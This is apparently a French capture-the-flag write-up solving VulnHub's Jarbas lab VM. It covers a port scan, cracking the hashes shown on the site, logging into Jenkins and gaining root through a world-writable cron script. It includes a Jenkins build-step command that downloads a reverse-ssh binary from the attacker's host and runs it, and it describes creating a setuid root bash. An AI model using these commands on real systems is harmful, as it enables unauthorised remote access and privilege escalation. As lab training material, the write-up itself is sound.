# Solution du CTF Jarbas de VulnHub

[Jarbas](https://www.vulnhub.com/entry/jarbas-1,232/), un CTF proposé sur VulnHub, est un peu le cousin germain de [Jeeves de HackTheBox](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Jeeves%20de%20HackTheBox.md).

Le scénario est d'ailleurs quasi identique : sur le port 80 on trouve une copie de l'ancien moteur de recherche `Ask.com`.

```
Nmap scan report for 192.168.56.70
Host is up (0.00025s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 28bc493c6c4329573cb8859a6d3c163f (RSA)
|   256 a01b902cda79eb8f3b14debb3fd2e73f (ECDSA)
|_  256 57720854b756ffc3e6166f97cfae7f76 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Jarbas - O Seu Mordomo Virtual!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
```

Sur le port 80 on nous offre directement des hashs pourtant ce n'est pas encore noël.

```
Creds encrypted in a safe way!

tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
```

J'ai envoyé tout ça sur crackstation qui a trouvé respectivement :

```
italia99
marianna
vipsu
```

Sur le port 8080 se trouve un Jenkins et les identifiants `eder` / `vipsu` permettent de s'y.

Du coup je ne m'attarde pas trop sur les étapes à suivre car elles sont déjà décrites dans le `Jeeves` : il faut créer un nouveau projet, aller dans sa configuration puis dans l'onglet `Build` puis sur la partie `Exécuter un script shell`.

Là on saisit de quoi obtenir un shell. Comme les ports ne sont pas filtrés sur la VM je rappatrie et fait tourner un reverse-ssh qui fonctionnera comme un serveur SSH mais sur le port 31337.

```bash
cd /tmp;wget http://192.168.56.1/reverse-sshx64;chmod +x reverse-sshx64;nohup ./reverse-sshx64
```

Pour m'y connecter j'utilise le client SSH de mon OS. Il y a un mot de passe par défaut (`letmeinbrudipls`) et j'obtiens un accès avec le compte `jenkins`.

Il y a une entrée dans la crontab :

`*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1`

Et ce script qui tourne en root est word-writable, quelle aubaine :p 

`-rwxrwxrwx. 1 root root 50 Apr  1  2018 /etc/script/CleaningScript.sh`

Je rajoute des commandes dedans pour copier `bash` vers `/tmp` et le rendre setuid root. Après quelques minutes c'est prêt, plus qu'à déguster :

```shellsession
bash-4.2$ /tmp/bash -p
bash-4.2# id
uid=997(jenkins) gid=995(jenkins) euid=0(root) groups=995(jenkins) context=system_u:system_r:initrc_t:s0
bash-4.2# cd /root
bash-4.2# ls
flag.txt
bash-4.2# cat flag.txt
Hey!

Congratulations! You got it! I always knew you could do it!
This challenge was very easy, huh? =)

Thanks for appreciating this machine.

@tiagotvrs
```

Forcément, avec ma connaissance de la version de HTB, ce CTF était du tout préparé, plus qu'à enfourner au micro-ondes !
